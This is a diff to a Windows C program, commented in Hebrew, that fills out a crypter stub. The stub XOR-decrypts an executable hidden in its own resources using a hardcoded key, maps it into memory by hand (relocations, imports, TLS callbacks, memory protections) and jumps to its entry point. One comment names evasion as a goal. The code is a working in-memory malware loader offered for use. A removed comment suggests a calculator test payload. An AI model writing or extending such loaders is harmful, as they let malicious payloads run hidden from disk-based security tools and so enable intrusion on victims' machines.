@@ -1,8 +1,10 @@
 ﻿#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include "resource.h"    // הגדרות ה-Resource ID
+#include "resource.h"    // ודאי שהקובץ קיים בפרויקט
 #include "crypto.h"      // פונקציית ה-XOR מה-Static Library
+
+// --- פונקציות עזר לטעינה רפלקטיבית ---
 
 void ResolveImports(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
     PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
@@ -37,14 +39,53 @@ void ResolveImports(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
     printf("[+] IAT fully resolved.\n");
 }
 
+void ExecuteTLSCallbacks(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
+    PIMAGE_DATA_DIRECTORY tlsDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    if (tlsDir->Size == 0) return;
+
+    PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((PUINT8)targetBase + tlsDir->VirtualAddress);
+    PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
+
+    if (callback) {
+        printf("[*] Executing TLS Callbacks...\n");
+        while (*callback) {
+            (*callback)(targetBase, DLL_PROCESS_ATTACH, NULL);
+            callback++;
+        }
+    }
+}
+
+void ProtectSections(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+    printf("[*] Applying final memory protections...\n");
+
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        DWORD oldProtect;
+        DWORD protection = PAGE_READONLY;
+
+        if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_READWRITE;
+        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) protection = PAGE_EXECUTE_READ;
+        if ((section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)) protection = PAGE_EXECUTE_READWRITE;
+
+        VirtualProtect((LPVOID)((PUINT8)targetBase + section[i].VirtualAddress), section[i].SizeOfRawData, protection, &oldProtect);
+    }
+}
+
 void MapPEToMemory(unsigned char* payload) {
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
 
-    // 1. הקצאת זיכרון ומיפוי סקציות (הקוד הקיים שלך...)
+    // 1. הקצאת זיכרון מלאה בגודל שה-Image דורש
     LPVOID targetBase = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!targetBase) {
+        printf("[-] VirtualAlloc failed\n");
+        return;
+    }
+
+    // 2. העתקת ה-Headers
     memcpy(targetBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders);
 
+    // 3. מיפוי הסקציות (Sections) לכתובות הווירטואליות שלהן
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
         if (section[i].SizeOfRawData > 0) {
@@ -53,100 +94,101 @@ void MapPEToMemory(unsigned char* payload) {
     }
     printf("[+] Mapping complete!\n");
 
-    // 2. תיקון Relocations
+    // 4. תיקון כתובות (Relocations) - קריטי להרצת EXE גנרי
     ULONG_PTR delta = (ULONG_PTR)targetBase - ntHeaders->OptionalHeader.ImageBase;
     if (delta != 0) {
         PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
         if (relocDir->Size > 0) {
-            // ... כאן נכנס לופ ה-Relocation שכתבת קודם ...
+            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PUINT8)targetBase + relocDir->VirtualAddress);
+
+            while (reloc->VirtualAddress != 0) {
+                DWORD entriesCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                PWORD entry = (PWORD)(reloc + 1);
+
+                for (DWORD i = 0; i < entriesCount; i++) {
+                    WORD type = entry[i] >> 12;   // סוג התיקון
+                    WORD offset = entry[i] & 0xFFF; // המיקום בתוך הבלוק
+
+                    if (type == IMAGE_REL_BASED_DIR64) {
+                        PULONG_PTR patchAddr = (PULONG_PTR)((PUINT8)targetBase + reloc->VirtualAddress + offset);
+                        *patchAddr += delta;
+                    }
+                    else if (type == IMAGE_REL_BASED_HIGHLOW) {
+                        DWORD* patchAddr = (DWORD*)((PUINT8)targetBase + reloc->VirtualAddress + offset);
+                        *patchAddr += (DWORD)delta;
+                    }
+                }
+                reloc = (PIMAGE_BASE_RELOCATION)((PUINT8)reloc + reloc->SizeOfBlock);
+            }
             printf("[+] Relocations applied successfully.\n");
         }
     }
 
-    // 3. תיקון IAT (חייב לקרות תמיד!)
+    // 5. תיקון ה-IAT (פונקציות ה-API של ווינדוס)
     ResolveImports(targetBase, ntHeaders);
 
-    // 4. הקפיצה ל-EntryPoint
+    // 6. הרצת TLS Callbacks (הכרחי לקבצי C++ מורכבים)
+    ExecuteTLSCallbacks(targetBase, ntHeaders);
+
+    // 7. הגדרת הרשאות זיכרון סופיות (עבור יציבות וחמקמקות)
+    ProtectSections(targetBase, ntHeaders);
+
+    // 8. הקפיצה הגדולה ל-EntryPoint
     printf("[!] JUMPING TO ENTRY POINT: 0x%p\n", (void*)((PUINT8)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint));
+    printf("--------------------------------------------------\n");
+
     typedef void (WINAPI* _PayloadEntry)();
     _PayloadEntry pEntry = (_PayloadEntry)((PUINT8)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
 
-    pEntry(); // המחשבון אמור להיפתח כאן!
+    pEntry();
 }
 int main() {
-    // 1. הגדרת פרמטרים בסיסיים
     char* key = "mysecretkey";
     printf("[*] Starting Stub execution...\n");
 
-    // 2. איתור ה-Payload במשאבים (Resources)
+    // איתור וטעינת ה-Resource
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
-    if (hRes == NULL) {
-        printf("[-] Failed to find resource. Error: %lu\n", GetLastError());
-        return 1;
-    }
+    if (!hRes) return 1;
 
-    // 3. טעינת המשאב וקבלת המצביע (Pointer)
     HGLOBAL hResData = LoadResource(NULL, hRes);
     unsigned char* pResData = (unsigned char*)LockResource(hResData);
     size_t resSize = SizeofResource(NULL, hRes);
 
-    if (!pResData || resSize == 0) {
-        printf("[-] Failed to lock or measure resource.\n");
-        return 1;
-    }
-    printf("[+] Resource loaded successfully. Size: %zu bytes\n", resSize);
-
-    // 4. הקצאת Buffer לפענוח
-    // אנחנו חייבים להעתיק ל-Buffer חדש כי הזיכרון של המשאבים הוא Read-Only
     unsigned char* payload = (unsigned char*)malloc(resSize);
-    if (payload == NULL) {
-        printf("[-] Memory allocation failed.\n");
-        return 1;
-    }
+    if (!payload) return 1;
     memcpy(payload, pResData, resSize);
 
-    // 5. פענוח המידע בזיכרון
-   // ... אחרי ה-memcpy לתוך payload ...
+    printf("[*] Decrypting payload with alignment hunter...\n");
 
-    printf("[*] Decrypting payload with potential alignment check...\n");
-
-    // ניסיון ראשון: פענוח רגיל (Offset 0)
+    // ניסיון ראשון: פענוח רגיל
     XorCipher(payload, resSize, key, strlen(key));
 
     if (payload[0] == 'M' && payload[1] == 'Z') {
-        printf("[+] Success! Valid MZ found at index 0.\n");
+        printf("[+] Success! MZ found at index 0.\n");
         MapPEToMemory(payload);
     }
     else {
-        // אם נכשל, נבטל את הפענוח הקודם (XOR חוזר מבטל את הראשון)
+        // ביטול הפענוח הראשון וניסיון עם הסטה של בייט אחד (פיצוי על ה-Resource Compiler)
         XorCipher(payload, resSize, key, strlen(key));
 
-        // ניסיון שני: פענוח עם הסטה של בייט אחד
-        // אנחנו עושים XOR לכל בייט payload[i+1] עם key[i]
         size_t keyLen = strlen(key);
         for (size_t i = 0; i < resSize - 1; i++) {
             payload[i + 1] ^= key[i % keyLen];
         }
 
         if (payload[1] == 'M' && payload[2] == 'Z') {
-            printf("[!] Success! MZ found at index 1 after adjusted decryption.\n");
-            MapPEToMemory(payload + 1); // שולחים לטעינה החל מהבייט השני
+            printf("[!] Success! MZ found at index 1 after alignment fix.\n");
+            MapPEToMemory(payload + 1);
         }
         else {
-            printf("[-] Critical Error: Could not find MZ even after alignment adjustment.\n");
-            printf("[*] Bytes at index 1-2: 0x%02X 0x%02X\n", payload[1], payload[2]);
+            printf("[-] Critical Error: Could not find MZ signature.\n");
             free(payload);
             return 1;
         }
     }
 
-
-    printf("[*] Payload ready for execution. Cleaning up...\n");
     free(payload);
-
-    // בגלל שאנחנו ב-Console App, נעצור כדי לראות את הפלט
     printf("\nPress Enter to exit...");
-    getchar();
-
+    (void)getchar();
     return 0;
 }
